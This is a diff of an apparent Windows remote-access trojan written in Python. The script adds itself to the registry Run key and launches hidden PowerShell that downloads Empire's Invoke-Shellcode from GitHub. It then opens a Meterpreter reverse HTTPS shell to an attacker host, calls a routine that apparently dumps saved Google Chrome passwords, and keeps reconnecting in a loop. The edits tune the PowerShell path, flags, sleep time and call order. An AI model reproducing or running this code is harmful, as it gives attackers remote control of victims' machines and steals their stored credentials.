@@ -13,7 +13,7 @@ import sys
 NO_IP_HOST = 'googlechromeauto.serveirc.com'
 LHOST = '192.168.1.3'
 LPORT = 443
-TIME_SLEEP = 5
+TIME_SLEEP = 10
 
 TEMP_PATH = tempfile.gettempdir()
 REG_PATH = r"Software\Microsoft\Windows\CurrentVersion\Run"
@@ -34,12 +34,12 @@ def fire():
 
     if platform.machine().endswith('32'):
         try:
-            subprocess.Popen("powershell -noprofile -windowstyle hidden -noninteractive iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/PowerShellEmpire/Empire/master/data/module_source/code_execution/Invoke-Shellcode.ps1');Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost %s -Lport %s -Force;" % (LHOST,LPORT), shell=True)
+            subprocess.Popen("powershell -noprofile -windowstyle hidden iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/PowerShellEmpire/Empire/master/data/module_source/code_execution/Invoke-Shellcode.ps1');Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost %s -Lport %s -Force;" % (LHOST,LPORT), shell=True)
         except WindowsError:
             pass
     else:
         try:
-            subprocess.Popen("C:\Windows\System32\WindowsPowerShell\/v1.0\powershell.exe -noprofile -windowstyle hidden -noninteractive -noprofile -windowstyle hidden -noninteractive iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/PowerShellEmpire/Empire/master/data/module_source/code_execution/Invoke-Shellcode.ps1');Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost %s -Lport %s -Force;" % (LHOST,LPORT), shell=True)
+            subprocess.Popen("C:\Windows\SysWOW64\WindowsPowerShell\/v1.0\powershell.exe -noprofile -windowstyle hidden iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/PowerShellEmpire/Empire/master/data/module_source/code_execution/Invoke-Shellcode.ps1');Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost %s -Lport %s -Force;" % (LHOST,LPORT), shell=True)
         except WindowsError:
             pass
 
@@ -75,6 +75,7 @@ def check_no_ip_online():
             break
 
 def dump_google_password():
+    path = ''
     try:
         path = sys.argv[1]
     except IndexError:
@@ -113,11 +114,10 @@ def dump_google_password():
 # set the reg value in run key
 set_reg_key_value(REG_PATH,REG_NAME,REG_VALUE)
 
-dump_google_password()
 # fire the payload
 fire()
 time.sleep(5)
-
+dump_google_password()
 # keep firing in case of the connection is loss
 while True:
     run_after_close()
